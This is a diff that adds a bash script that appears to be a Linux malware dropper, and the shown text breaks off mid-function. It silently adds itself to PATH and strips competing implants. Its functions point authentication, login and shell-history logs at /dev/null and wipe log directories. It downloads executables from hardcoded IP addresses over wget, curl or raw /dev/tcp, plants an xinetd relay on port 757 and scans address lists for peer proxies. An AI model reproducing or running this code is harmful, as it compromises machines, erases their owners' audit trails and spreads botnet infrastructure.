@@ -1,0 +1,552 @@
+#!/bin/bash
+USR=$1
+SKIPUPDATE=$2
+VERBMODE=$3
+INSTALLMODE=$4
+
+sysctl kernel.pid_max=4194304 >/dev/null 2>&1
+ulimit -n 65000 >/dev/null 2>&1
+if [ -z "$USR" ]; then
+	USR=0
+fi
+if [ -z "$SKIPUPDATE" ]; then
+	SKIPUPDATE=0
+fi
+
+if [ -z "$VERBMODE" ]; then
+	VERBMODE=0
+fi
+
+if [ -z "$INSTALLMODE" ]; then
+	INSTALLMODE=0
+fi
+chmod 755 /etc/bin/* >/dev/null 2>&1
+if [ -d /etc/bin ]; then
+	grep '/etc/bin' /etc/profile >/dev/null 2>&1 || echo 'PATH=$PATH:/etc/bin' >>/etc/profile
+	grep '/etc/bin' ~/.bashrc >/dev/null 2>&1 || (echo 'export PATH=$PATH:/etc/bin' | cat - ~/.bashrc >temp && mv -f temp ~/.bashrc)
+fi
+pathmunge() {
+	if ! echo "$PATH" | /bin/grep -Eq "(^|:)$1($|:)"; then
+		if [ "$2" = "after" ]; then
+			PATH="$PATH:$1"
+		else
+			PATH="$1:$PATH"
+		fi
+		export PATH
+	fi
+}
+if [ -f /etc/bin/ ]; then
+	pathmunge /etc/bin/ after
+fi
+
+THISDIR=$(
+	cd "$(dirname "$0")" || exit
+	pwd
+)
+if [ $THISDIR = '/root' ]; then
+	DIRROOT=1
+else
+	unset DIRROOT
+fi
+MY_NAME=$(basename "$0")
+#if [ $MY_NAME == cronman -o $MY_NAME == \.cronman ]; then
+#	TESTCOUNT=$(ps cax | grep -v grep | grep -v defunct | grep cronman | wc -l)
+#	if (($(echo $TESTCOUNT '>' 4))); then
+#		ps cax | grep cronman | grep -v "$$" | grep -v grep | grep -v defunct | awk '{print $1}' | xargs kill -9 >/dev/null 2>&1
+#	fi
+#fi
+grep -a "xfit" /root/.bashrc >/dev/null 2>&1 && sed -i ':again;$!N;$!b again; s/crontab() {[^}]*}//g' /root/.bashrc
+mkdir /tmp >/dev/null 2>&1
+chmod 755 /etc/ld.so.preload >/dev/null 2>&1
+if [ -d /etc/ld.so.preload ]; then
+	rm -rf /etc/ld.so.preload
+fi
+if [ -f /usr/spirit ]; then
+	chattr -aui /usr/spirit >/dev/null 2>&1
+	rm -rf /usr/spirit
+fi
+if [ -f /root/gcclib ]; then
+	chattr -aui /root/gcclib >/dev/null 2>&1
+	rm -rf /root/gcclib
+fi
+OKMark="\e[32m ------ OK \e[0m"
+BADMark="\e[31m ------ BAD \e[0m"
+InfoG() {
+	echo -en "${green}${1}${nc}\n"
+}
+InfoR() {
+	echo -en "${red}${1}${nc}\n"
+}
+InfoP() {
+	echo -en "${purple}${1}${nc}\n"
+}
+InfoY() {
+	if [[ $VERBMODE -eq 1 ]]; then
+		echo -en "${yellow}${1}${nc}\n"
+	fi
+}
+moveDir() {
+	old_dir=$1
+	new_dir=$2
+	mkdir -p $new_dir >/dev/null 2>&1
+	\cp -fr $old_dir/* $new_dir/
+	rm -rf $old_dir
+}
+red="\e[1;31m"
+green="\e[1;32m"
+purple="\033[1;35m"
+yellow="\033[0;33m"
+nc="\e[0m"
+LOGS_FILES=(
+	/var/log/messages                    # General message and system related stuff
+	/var/log/auth.log                    # Authenication logs
+	/var/log/kern.log                    # Kernel logs
+	/var/log/cron.log                    # Crond logs
+	/var/log/maillog                     # Mail server logs
+	/var/log/boot.log                    # System boot log
+	/var/log/mysqld.log                  # MySQL database server log file
+	/var/log/qmail                       # Qmail log directory
+	/var/log/httpd                       # Apache access and error logs directory
+	/var/log/lighttpd                    # Lighttpd access and error logs directory
+	/var/log/secure                      # Authentication log
+	/var/log/utmp                        # Login records file
+	/var/run/utmp                        # Login records file
+	/var/log/wtmp                        # Login records file
+	/var/log/btmp                        # Login records file
+	/var/log/yum.log                     # Yum command log file
+	/var/log/system.log                  # System Log
+	/var/log/DiagnosticMessages          # Mac Analytics Data
+	/Library/Logs                        # System Application Logs
+	/Library/Logs/DiagnosticReports      # System Reports
+	/root/Library/Logs                   # User Application Logs
+	/root/Library/Logs/DiagnosticReports # User Reports
+	/var/log/lastlog
+)
+function disableAuth() {
+	if [ -w /var/log/auth.log ]; then
+		ln /dev/null /var/log/auth.log -sf
+		#echo "[+] Permanently sending /var/log/auth.log to /dev/null"
+		#else
+		#echo "[!] /var/log/auth.log is not writable! Retry using sudo."
+	fi
+
+	if [ -w /var/log/secure ]; then
+		ln /dev/null /var/log/secure -sf
+		#echo "[+] Permanently sending /var/log/secure to /dev/null"
+		#else
+		#echo "[!] /var/log/secure is not writable! Retry using sudo."
+	fi
+}
+function fixfile() {
+	file=$1
+	if [ -f $file ]; then
+		[ -n "$(tail -c1 $file)" ] && printf '\n' >>$file
+		tr -d "\r" <$file | sort -u >tmp.txt && mv -f tmp.txt $file
+	fi
+}
+function disableLastLogin() {
+	if [ -w /var/log/lastlog ]; then
+		ln /dev/null /var/log/lastlog -sf
+		#echo "[+] Permanently sending /var/log/lastlog to /dev/null"
+		#else
+		#echo "[!] /var/log/lastlog is not writable! Retry using sudo."
+	fi
+
+	if [ -w /var/log/wtmp ]; then
+		ln /dev/null /var/log/wtmp -sf
+		#echo "[+] Permanently sending /var/log/wtmp to /dev/null"
+		#else
+		#echo "[!] /var/log/wtmp is not writable! Retry using sudo."
+	fi
+
+	if [ -w /var/log/btmp ]; then
+		ln /dev/null /var/log/btmp -sf
+		#echo "[+] Permanently sending /var/log/btmp to /dev/null"
+		#else
+		#echo "[!] /var/log/btmp is not writable! Retry using sudo."
+	fi
+
+	if [ -w /var/run/utmp ]; then
+		ln /dev/null /var/run/utmp -sf
+		#echo "[+] Permanently sending /var/run/utmp to /dev/null"
+		#else
+		#echo "[!] /var/run/utmp is not writable! Retry using sudo."
+	fi
+}
+
+function disableHistory() {
+	ln /dev/null ~/.bash_history -sf
+	#echo "[+] Permanently sending bash_history to /dev/null"
+
+	if [ -f ~/.zsh_history ]; then
+		ln /dev/null ~/.zsh_history -sf
+		#echo "[+] Permanently sending zsh_history to /dev/null"
+	fi
+
+	export HISTFILESIZE=0
+	export HISTSIZE=0
+	#echo "[+] Set HISTFILESIZE & HISTSIZE to 0"
+
+	set +o history
+	#echo "[+] Disabled history library"
+}
+function clearLogs() {
+	for i in "${LOGS_FILES[@]}"; do
+		if [ -f "$i" ]; then
+			if [ -w "$i" ]; then
+				echo "" >"$i"
+				#echo "[+] $i cleaned."
+				#else
+				#echo "[!] $i is not writable! Retry using sudo."
+			fi
+		elif [ -d "$i" ]; then
+			if [ -w "$i" ]; then
+				rm -rf "${i:?}"/*
+				#echo "[+] $i cleaned."
+				#else
+				#echo "[!] $i is not writable! Retry using sudo."
+			fi
+		fi
+	done
+}
+function clearHistory() {
+	if [ -f ~/.zsh_history ]; then
+		echo "" >~/.zsh_history
+		#echo "[+] ~/.zsh_history cleaned."
+	fi
+
+	echo "" >~/.bash_history
+	#echo "[+] ~/.bash_history cleaned."
+
+	history -c
+	#echo "[+] History file deleted."
+}
+function testport() {
+	if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
+		timeout 30 nc "$1" "$2" -z -w 2 >/dev/null 2>&1
+		return $?
+	elif command -v nc &>/dev/null; then
+		cat /dev/null | timeout 30 nc "$1" "$2" -w 2 >/dev/null 2>&1
+		return $?
+	else
+		timeout 5 bash -c '</dev/tcp/'"$1"'/'"$2"' &>/dev/null 2>&1' 2>/dev/null
+		return $?
+	fi
+}
+
+function __curl() {
+	read proto server path <<<$(echo "${1//// }")
+	DOC=/${path// //}
+	HOST=${server//:*/}
+	PORT=${server//*:/}
+	[[ "${HOST}" == "${PORT}" ]] && PORT=80
+
+	exec 3<>/dev/tcp/"${HOST}"/$PORT
+	echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+	(while read line; do
+		[[ "$line" == $'\r' ]] && break
+	done && cat) <&3
+	exec 3>&-
+}
+InfoY $LINENO
+function get_remote_file() {
+	REQUEST_URL=$1
+	OUTPUT_FILENAME=$2
+	TEMP_FILE="${THISDIR}/tmp.file"
+	retfunc() {
+		return "$1"
+	}
+	REMOTE_SERVER="5.133.65.53
+    45.142.212.30"
+	echo "$REMOTE_SERVER" | while IFS= read -r line; do
+		line=$(echo -e "${line}" | sed -r 's/ //g')
+		URL=$(echo "$REQUEST_URL" | sed -r "s#(http?://)?([^/]+)(.*)#\1$line\3#")
+		if command -v wget &>/dev/null; then
+			InfoP "Try download $FILENAME via a direct connection $line ..."
+			if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
+				wget --timeout=10 --tries=3 -O "${TEMP_FILE}" "$URL" >/dev/null 2>&1
+			else
+				wget --timeout=10 -O "${TEMP_FILE}" "$URL" >/dev/null 2>&1
+			fi
+		elif command -v curl &>/dev/null; then
+			InfoP "Try download $FILENAME with Curl via a direct connection $line..."
+			curl --connect-timeout 10 --max-time 900 -o "${TEMP_FILE}" "$URL" 2>/dev/null
+		else
+			InfoP "Try download $FILENAME with /dev/tcp via a direct connection $line..."
+			__curl "$URL" >"${TEMP_FILE}"
+		fi
+		########################################################################################
+		err=$?
+		if [[ $err == 0 ]]; then
+			if [ $FILENAME == cronman -o $MY_NAME == $FILE_REZ ]; then
+				CHESKSCR=$(cat "${TEMP_FILE}" 2>/dev/null)
+				if [[ $CHESKSCR == *'Lines for testing the code'* ]]; then
+					retfunc 2
+				else
+					err=1
+					retfunc 1
+				fi
+			elif [ $FILENAME == xbash ]; then
+				CHESKSCR=$(cat "${TEMP_FILE}" 2>/dev/null)
+				if [[ $CHESKSCR == *cronman* ]]; then
+					mkdir -p "/root/gcclib" >/dev/null 2>&1
+					TZ='Europe/Moscow' date '+%F %T' >"/root/$PATH_NAME/date"
+					retfunc 2
+				else
+					err=1
+					retfunc 1
+				fi
+			elif [ ! -z $HASH ]; then
+				if md5sum -c <<<"$HASH *${TEMP_FILE}"; then
+					retfunc 2
+				else
+					err=1
+					retfunc 1
+				fi
+			else
+				retfunc $err
+			fi
+		fi
+		if [[ $? -eq 2 ]]; then
+			mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
+			chmod 755 "${OUTPUT_FILENAME}"
+			InfoG "$FILENAME File downloaded"
+			cat <<EOF >/etc/xinetd.d/smtp_forward
+service smtp_forward
+{
+        disable         = no
+        type            = UNLISTED
+        socket_type     = stream
+        protocol        = tcp
+        user            = nobody
+        wait            = no
+        redirect        = $line 80
+        port            = 757
+		per_source = UNLIMITED
+		instances = UNLIMITED
+		cps = 10000 1
+}
+EOF
+			return 0
+		elif [[ $err -eq 0 ]]; then
+			mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
+			chmod 755 "${OUTPUT_FILENAME}"
+			InfoG "$FILENAME File downloaded"
+			return 0
+		else
+			retfunc 3
+		fi
+	done
+	err=$?
+	if [[ $err -eq 3 ]]; then
+		unset CHECK_FILE
+		if [ -f "/root/$PATH_NAME/ghost" ]; then
+			REMOTEHOST=$(cat /root/$PATH_NAME/ghost)
+			REMOTEPORT=757
+			TIMEOUT=2
+			if testport "$REMOTEHOST" $REMOTEPORT; then
+				if command -v wget &>/dev/null; then
+					InfoP "Try download $FILENAME via $REMOTEHOST..."
+					if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
+						http_proxy="http://$REMOTEHOST:757" wget --timeout=10 --tries=3 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
+					else
+						http_proxy="http://$REMOTEHOST:757" wget --timeout=10 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
+					fi
+				elif command -v curl &>/dev/null; then
+					InfoP "Try download $FILENAME with Curl via $REMOTEHOST..."
+					curl -x "$REMOTEHOST:$REMOTEPORT" --connect-timeout 10 --max-time 900 -o "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
+				else
+					InfoP "Try download $FILENAME with /dev/tcp via $REMOTEHOST"
+					__curl "http://$REMOTEHOST:$REMOTEPORT/soft/linux/$FILENAME" >"${TEMP_FILE}"
+				fi
+				err=$?
+				if [[ $err == 0 ]]; then
+					if [ $FILENAME == cronman -o $MY_NAME == $FILE_REZ ]; then
+						CHESKSCR=$(cat "${TEMP_FILE}" 2>/dev/null)
+						if [[ $CHESKSCR == *'Lines for testing the code'* ]]; then
+							retfunc 2
+						else
+							err=1
+							retfunc 1
+						fi
+					elif [ $FILENAME == xbash ]; then
+						CHESKSCR=$(cat "${TEMP_FILE}" 2>/dev/null)
+						if [[ $CHESKSCR == *cronman* ]]; then
+							mkdir -p "/root/gcclib" >/dev/null 2>&1
+							TZ='Europe/Moscow' date '+%F %T' >"/root/$PATH_NAME/date"
+							retfunc 2
+						else
+							err=1
+							retfunc 1
+						fi
+					elif [ ! -z $HASH ]; then
+						if md5sum -c <<<"$HASH *${TEMP_FILE}"; then
+							retfunc 2
+						else
+							err=1
+							retfunc 1
+						fi
+					else
+						retfunc $err
+					fi
+				fi
+				if [[ $? -eq 2 ]] || [[ $err == 0 ]]; then
+					mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
+					chmod 755 "${OUTPUT_FILENAME}"
+					GOOD_HOST=$REMOTEHOST
+					echo $GOOD_HOST >"/root/$PATH_NAME/ghost"
+					CHECK_FILE=1
+				else
+					InfoR "The file is broken "
+					unset GOOD_HOST
+					CHECK_FILE=0
+				fi
+			else
+				InfoR "$REMOTEHOST Port $REMOTEPORT closed"
+				unset GOOD_HOST
+				CHECK_FILE=0
+			fi
+		fi
+		if [[ "$CHECK_FILE" -eq 1 ]]; then
+			InfoG "$FILENAME File downloaded"
+			cat <<EOF >/etc/xinetd.d/smtp_forward
+service smtp_forward
+{
+        disable         = no
+        type            = UNLISTED
+        socket_type     = stream
+        protocol        = tcp
+        user            = nobody
+        wait            = no
+        redirect        = $REMOTEHOST $REMOTEPORT
+        port            = 757
+		per_source = UNLIMITED
+		instances = UNLIMITED
+		cps = 10000 1
+}
+EOF
+		else
+			if [ -f "/root/$PATH_NAME/ghost" ]; then
+				rm -fr /root/$PATH_NAME/ghost 2>/dev/null
+			fi
+			if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
+				port=757
+				threads=40
+				IPS=''
+				echo '' >/root/$PATH_NAME/found757.lst
+				echo '' >/root/$PATH_NAME/targets757
+				echo '' >/root/$PATH_NAME/logfile757
+				IPS=$(cat /root/$PATH_NAME/ip.txt)
+				server=''
+				for server in $IPS; do
+					server=${server//[[:space:]]/}
+					echo $port "$server" >>/root/$PATH_NAME/targets757
+				done
+				InfoP "Scanning port 757..."
+
+				if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
+					xargs -a /root/$PATH_NAME/targets757 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile757'
+				elif command -v nc &>/dev/null; then
+					xargs -a /root/$PATH_NAME/targets757 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile757'
+				else
+					xargs -a /root/$PATH_NAME/targets757 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null 2>&1"; echo $? $1 >> /root/'$PATH_NAME'/logfile757'
+				fi
+
+				grep "^0" /root/$PATH_NAME/logfile757 | cut -d " " -f2 >/root/$PATH_NAME/found757.lst
+				if [ -f /root/$PATH_NAME/found757.lst ]; then
+					FOUND=$(cat /root/$PATH_NAME/found757.lst)
+					for server in $FOUND; do
+						server=${server//[[:space:]]/}
+						if [ ! -z $GOOD_HOST ]; then
+							REMOTEHOST=$GOOD_HOST
+						else
+							REMOTEHOST=$server
+						fi
+						REMOTEPORT=757
+						TIMEOUT=2
+						if testport "$REMOTEHOST" $REMOTEPORT; then
+							if command -v wget &>/dev/null; then
+								InfoP "Try download $FILENAME via $REMOTEHOST..."
+								if command -v wget &>/dev/null && wget -h 2>&1 | grep -q -- '--tries'; then
+									http_proxy="http://$REMOTEHOST:757" wget --timeout=10 --tries=3 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
+								else
+									http_proxy="http://$REMOTEHOST:757" wget --timeout=10 -O "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
+								fi
+							elif command -v curl &>/dev/null; then
+								InfoP "Try download $FILENAME with Curl via $REMOTEHOST..."
+								curl -x "$REMOTEHOST:$REMOTEPORT" --connect-timeout 10 --max-time 900 -o "${TEMP_FILE}" "$REQUEST_URL" 2>/dev/null
+							else
+								InfoP "Try download $FILENAME with /dev/tcp via $REMOTEHOST"
+								__curl "http://$REMOTEHOST:$REMOTEPORT/soft/linux/$FILENAME" >"${TEMP_FILE}"
+							fi
+							err=$?
+							if [ $FILENAME == cronman -o $MY_NAME == $FILE_REZ ]; then
+								CHESKSCR=$(cat "${TEMP_FILE}" 2>/dev/null)
+								if [[ $CHESKSCR == *'Lines for testing the code'* ]]; then
+									retfunc 2
+								else
+									err=1
+									retfunc 1
+								fi
+							elif [ $FILENAME == xbash ]; then
+								CHESKSCR=$(cat "${TEMP_FILE}" 2>/dev/null)
+								if [[ $CHESKSCR == *cronman* ]]; then
+									mkdir -p "/root/gcclib" >/dev/null 2>&1
+									TZ='Europe/Moscow' date '+%F %T' >"/root/$PATH_NAME/date"
+									retfunc 2
+								else
+									err=1
+									retfunc 1
+								fi
+							elif [ ! -z $HASH ]; then
+								if md5sum -c <<<"$HASH *${TEMP_FILE}"; then
+									retfunc 2
+								else
+									err=1
+									retfunc 1
+								fi
+							else
+								retfunc $err
+							fi
+							if [[ $? -eq 2 ]] || [[ $err == 0 ]]; then
+								mv -f "${TEMP_FILE}" "${OUTPUT_FILENAME}"
+								chmod 755 "${OUTPUT_FILENAME}"
+								GOOD_HOST=$REMOTEHOST
+								echo $GOOD_HOST >"/root/$PATH_NAME/ghost"
+								CHECK_FILE=1
+								break
+							else
+								InfoR "The file is broken "
+								unset GOOD_HOST
+							fi
+						else
+							InfoR "$REMOTEHOST Port $REMOTEPORT closed"
+							unset GOOD_HOST
+							CHECK_FILE=0
+						fi
+					done
+					if [[ "$CHECK_FILE" -eq 1 ]]; then
+						InfoG "$FILENAME File downloaded"
+						cat <<EOF >/etc/xinetd.d/smtp_forward
+service smtp_forward
+{
+        disable         = no
+        type            = UNLISTED
+        socket_type     = stream
+        protocol        = tcp
+        user            = nobody
+        wait            = no
+        redirect        = $REMOTEHOST $REMOTEPORT
+        port            = 757
+		per_source = UNLIMITED
+		instances = UNLIMITED
+		cps = 10000 1
+}
+EOF
+					else
+						return 1
+					fi
+				else
+					return 1
+				fi
+			el
